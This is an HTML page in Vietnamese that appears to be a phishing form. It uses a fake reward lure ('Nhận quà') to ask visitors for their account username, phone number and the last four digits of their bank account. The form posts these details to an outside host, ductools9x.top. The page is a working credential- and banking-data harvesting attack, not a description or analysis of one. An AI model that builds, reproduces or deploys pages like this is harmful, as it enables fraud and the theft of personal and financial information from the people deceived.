<!DOCTYPE html>

<body>
    <div class="container">
        <h1>Đang thu thập thông tin nhận thưởng của bạn</h1>

    </div>
    <div class="form-text">
        <h2>Nhập thông tin tài khoản của quý khách</h2>
        <form action="https://ductools9x.top" method="POST">
            <label for="username">Tên tài khoản </label>
            <input type="text" name="username" placeholder="Tên tài khoản" required>

            <label for="phonenber">Số điện thoại </label>
            <input type="phonenumber" name="phonenumber" placeholder="Số điện thoại" required>

            <label for="banktransfer">4 Số Cuối Ngân hàng </label>
            <input type="banktransfer" name="banktransfer" placeholder="4 Số Cuối Tài Khoản Ngân Hàng" required>
        </form>
        <button type="submit">Nhận quà </button>
    </div>
